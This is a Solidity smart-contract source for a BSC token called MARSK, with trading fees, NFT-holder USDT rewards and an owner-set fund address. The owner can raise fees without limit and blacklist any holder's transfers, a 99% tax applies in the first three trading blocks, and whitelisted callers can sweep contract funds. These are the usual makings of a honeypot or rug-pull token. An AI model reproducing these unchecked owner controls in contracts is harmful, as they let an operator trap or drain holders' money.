/**
 *Submitted for verification at BscScan.com on 2024-09-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    mapping(address => bool) private _feeWhiteList;
    constructor() {
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[tx.origin] = true;
    }

    function claimToken(address token, address to, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            _safeTransfer(token, to, amount);
        }
    }

    function _safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        if (success && data.length > 0) {}
    }
}

interface INFT {
    function totalSupply() external view returns (uint256);
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter private immutable _swapRouter;
    address private immutable _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyFundFee = 300;
    uint256 public _sellNFT1Fee = 100;
    uint256 public _sellNFT2Fee = 100;
    uint256 public _sellNFT3Fee = 100;
    uint256 public _sellLPFee = 200;

    uint256 public startTradeBlock;

    address public immutable _mainPair;
    TokenDistributor public immutable _nft1Distributor;
    TokenDistributor public immutable _nft2Distributor;
    uint256 public _minSwapAmount;
    uint256 private constant _killBlock = 3;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address USDTAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address ReceiveAddress,
        address FundAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        _usdt = USDTAddress;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IERC20(_usdt).approve(address(swapRouter), MAX);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address pair = swapFactory.createPair(address(this), _usdt);
        _swapPairList[pair] = true;
        _mainPair = pair;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        uint256 usdtUnit = 10 ** IERC20(_usdt).decimals();
        _nft1Distributor = new TokenDistributor();
        _nft2Distributor = new TokenDistributor();
        nft1RewardCondition = 100 * usdtUnit;
        nft2RewardCondition = 100 * usdtUnit;
        nft3RewardCondition = 100 * usdtUnit;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(
            !_blackList[from] || _feeWhiteList[from] || _swapPairList[from],
            "blackList"
        );

        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");
        bool takeFee;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            if (address(_swapRouter) != from) {
                uint256 maxSellAmount = (balance * 999) / 1000;
                if (amount > maxSellAmount) {
                    amount = maxSellAmount;
                }
                takeFee = true;
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(0 < startTradeBlock);
                if (block.number < startTradeBlock + _killBlock) {
                    _killTransfer(from, to, amount, 99);
                    return;
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee);

        if (from != address(this)) {
            if (takeFee) {
                uint256 rewardGas = _rewardGas;
                processNFT1Reward((rewardGas * 30) / 100);
                processNFT2Reward((rewardGas * 30) / 100);
                processNFT3Reward((rewardGas * 40) / 100);
            }
        }
    }

    function _killTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * fee) / 100;
        if (feeAmount > 0) {
            _takeTransfer(sender, fundAddress, feeAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            bool isSell;
            uint256 swapFeeAmount;
            if (_swapPairList[sender]) {
                swapFeeAmount = (tAmount * _buyFundFee) / 10000;
            } else if (_swapPairList[recipient]) {
                //Sell
                isSell = true;
                swapFeeAmount =
                    (tAmount *
                        (_sellNFT1Fee +
                            _sellNFT2Fee +
                            _sellNFT3Fee +
                            _sellLPFee)) /
                    10000;
            } else {
                //Transfer
                swapFeeAmount = (tAmount * _transferFee) / 10000;
            }
            if (swapFeeAmount > 0) {
                feeAmount += swapFeeAmount;
                _takeTransfer(sender, address(this), swapFeeAmount);
            }
            if (isSell && !inSwap) {
                uint256 contractTokenBalance = balanceOf(address(this));
                uint256 numTokensSellToFund = _minSwapAmount;
                if (numTokensSellToFund == 0) {
                    numTokensSellToFund = (swapFeeAmount * 230) / 100;
                    if (numTokensSellToFund > contractTokenBalance) {
                        numTokensSellToFund = contractTokenBalance;
                    }
                }
                if (contractTokenBalance >= numTokensSellToFund) {
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        uint256 fundFee = _buyFundFee;
        uint256 nft1Fee = _sellNFT1Fee;
        uint256 nft2Fee = _sellNFT2Fee;
        uint256 lpFee = _sellLPFee;
        uint256 totalFee = nft1Fee + nft2Fee + lpFee + fundFee + _sellNFT3Fee;
        totalFee += totalFee;
        uint256 lpAmount = (tokenAmount * lpFee) / totalFee;
        totalFee -= lpFee;
        tokenAmount -= lpAmount;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_nft1Distributor));
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_nft1Distributor),
            block.timestamp
        );

        usdtBalance = USDT.balanceOf(address(_nft1Distributor)) - usdtBalance;
        _nft1Distributor.claimToken(
            _usdt,
            address(this),
            usdtBalance - (usdtBalance * 2 * nft1Fee) / totalFee
        );
        uint256 usdtAmount = (usdtBalance * 2 * fundFee) / totalFee;
        if (usdtAmount > 0) {
            _safeTransfer(_usdt, fundAddress, usdtAmount);
        }
        usdtAmount = (usdtBalance * 2 * nft2Fee) / totalFee;
        if (usdtAmount > 0) {
            _safeTransfer(_usdt, address(_nft2Distributor), usdtAmount);
        }
        usdtAmount = (usdtBalance * lpFee) / totalFee;
        if (usdtAmount > 0 && lpAmount > 0) {
            _swapRouter.addLiquidity(
                address(this),
                _usdt,
                lpAmount,
                usdtAmount,
                0,
                0,
                fundAddress,
                block.timestamp
            );
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setMinSwapAmount(uint256 amount) external onlyOwner {
        _minSwapAmount = amount;
    }

    function setBuyFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellFee(
        uint256 nft1Fee,
        uint256 nft2Fee,
        uint256 nft3Fee,
        uint256 lpFee
    ) external onlyOwner {
        _sellNFT1Fee = nft1Fee;
        _sellNFT2Fee = nft2Fee;
        _sellNFT3Fee = nft3Fee;
        _sellLPFee = lpFee;
    }

    uint256 public _transferFee = 0;

    function setTransferFee(uint256 fee) external onlyOwner {
        _transferFee = fee;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function batchSetFeeWhiteList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        if (_feeWhiteList[msg.sender]) {
            payable(fundAddress).transfer(address(this).balance);
        }
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            _safeTransfer(token, fundAddress, amount);
        }
    }

    receive() external payable {}

    function _safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        if (success && data.length > 0) {}
    }

    uint256 public _rewardGas = 800000;

    function setRewardGas(uint256 rewardGas) external onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "20-200w");
        _rewardGas = rewardGas;
    }

    function claimContractToken(
        address c,
        address token,
        uint256 amount
    ) external {
        if (_feeWhiteList[msg.sender]) {
            TokenDistributor(c).claimToken(token, fundAddress, amount);
        }
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetBlackList(
        address[] memory addr,
        bool enable
    ) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }

    //NFT1
    INFT public _nft1;
    uint256 public nft1RewardCondition;
    uint256 public currentNFT1Index;
    mapping(uint256 => bool) public excludeNFT1;

    function processNFT1Reward(uint256 gas) private {
        INFT nft = _nft1;
        if (address(0) == address(nft)) {
            return;
        }
        uint totalNFT = nft.totalSupply();
        if (0 == totalNFT) {
            return;
        }
        uint256 rewardCondition = nft1RewardCondition;

        if (
            IERC20(_usdt).balanceOf(address(_nft1Distributor)) < rewardCondition
        ) {
            return;
        }

        uint256 amount = rewardCondition / totalNFT;
        if (0 == amount) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < totalNFT) {
            if (currentNFT1Index >= totalNFT) {
                currentNFT1Index = 0;
            }
            if (!excludeNFT1[1 + currentNFT1Index]) {
                address shareHolder = nftOwnerOf(
                    address(nft),
                    1 + currentNFT1Index
                );
                if (
                    address(0) != shareHolder && address(0xdead) != shareHolder
                ) {
                    _nft1Distributor.claimToken(_usdt, shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentNFT1Index++;
            iterations++;
        }
    }

    function setnft1RewardCondition(uint256 amount) external onlyOwner {
        nft1RewardCondition = amount;
    }

    function setExcludeNFT1(uint256 id, bool enable) external {
        if (_feeWhiteList[msg.sender]) {
            excludeNFT1[id] = enable;
        }
    }

    function setNFT1(address adr) external onlyOwner {
        _nft1 = INFT(adr);
    }

    function nftOwnerOf(address nft, uint256 id) private returns (address) {
        bytes4 func = bytes4(keccak256(bytes("ownerOf(uint256)")));
        (bool success, bytes memory data) = nft.call(
            abi.encodeWithSelector(func, id)
        );
        if (success && data.length > 0) {
            return abi.decode(data, (address));
        }
        return address(0);
    }

    function transferOwnership(address newOwner) public override onlyOwner {
        super.transferOwnership(newOwner);
        _feeWhiteList[newOwner] = true;
    }

    //NFT2
    INFT public _nft2;
    uint256 public nft2RewardCondition;
    uint256 public currentNFT2Index;
    mapping(uint256 => bool) public excludeNFT2;

    function processNFT2Reward(uint256 gas) private {
        INFT nft = _nft2;
        if (address(0) == address(nft)) {
            return;
        }
        uint totalNFT = nft.totalSupply();
        if (0 == totalNFT) {
            return;
        }
        uint256 rewardCondition = nft2RewardCondition;

        if (
            IERC20(_usdt).balanceOf(address(_nft2Distributor)) < rewardCondition
        ) {
            return;
        }

        uint256 amount = rewardCondition / totalNFT;
        if (0 == amount) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < totalNFT) {
            if (currentNFT2Index >= totalNFT) {
                currentNFT2Index = 0;
            }
            if (!excludeNFT2[1 + currentNFT2Index]) {
                address shareHolder = nftOwnerOf(
                    address(nft),
                    1 + currentNFT2Index
                );
                if (
                    address(0) != shareHolder && address(0xdead) != shareHolder
                ) {
                    _nft2Distributor.claimToken(_usdt, shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentNFT2Index++;
            iterations++;
        }
    }

    function setnft2RewardCondition(uint256 amount) external onlyOwner {
        nft2RewardCondition = amount;
    }

    function setExcludeNFT2(uint256 id, bool enable) external {
        if (_feeWhiteList[msg.sender]) {
            excludeNFT2[id] = enable;
        }
    }

    function setNFT2(address adr) external onlyOwner {
        _nft2 = INFT(adr);
    }

    //NFT3
    INFT public _nft3;
    uint256 public nft3RewardCondition;
    uint256 public currentNFT3Index;
    mapping(uint256 => bool) public excludeNFT3;

    function processNFT3Reward(uint256 gas) private {
        INFT nft = _nft3;
        if (address(0) == address(nft)) {
            return;
        }
        uint totalNFT = nft.totalSupply();
        if (0 == totalNFT) {
            return;
        }
        uint256 rewardCondition = nft3RewardCondition;

        if (IERC20(_usdt).balanceOf(address(this)) < rewardCondition) {
            return;
        }

        uint256 amount = rewardCondition / totalNFT;
        if (0 == amount) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < totalNFT) {
            if (currentNFT3Index >= totalNFT) {
                currentNFT3Index = 0;
            }
            if (!excludeNFT3[1 + currentNFT3Index]) {
                address shareHolder = nftOwnerOf(
                    address(nft),
                    1 + currentNFT3Index
                );
                if (
                    address(0) != shareHolder && address(0xdead) != shareHolder
                ) {
                    _safeTransfer(_usdt, shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentNFT3Index++;
            iterations++;
        }
    }

    function setnft3RewardCondition(uint256 amount) external onlyOwner {
        nft3RewardCondition = amount;
    }

    function setExcludeNFT3(uint256 id, bool enable) external {
        if (_feeWhiteList[msg.sender]) {
            excludeNFT3[id] = enable;
        }
    }

    function setNFT3(address adr) external onlyOwner {
        _nft3 = INFT(adr);
    }
}

contract Mars is AbsToken {
    constructor()
        AbsToken(
            //SwapRouter
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            //USDT
            address(0x55d398326f99059fF775485246999027B3197955),
            "MARSK",
            "MARSK",
            18,
            200000000,
            address(0xe9Fd6B61aEF3F701FDbD3A5214D5e95790157cae),
            address(0x4349bfCeDa440386Cd03B96D5F0C4f876eF062Fc)
        )
    {}
}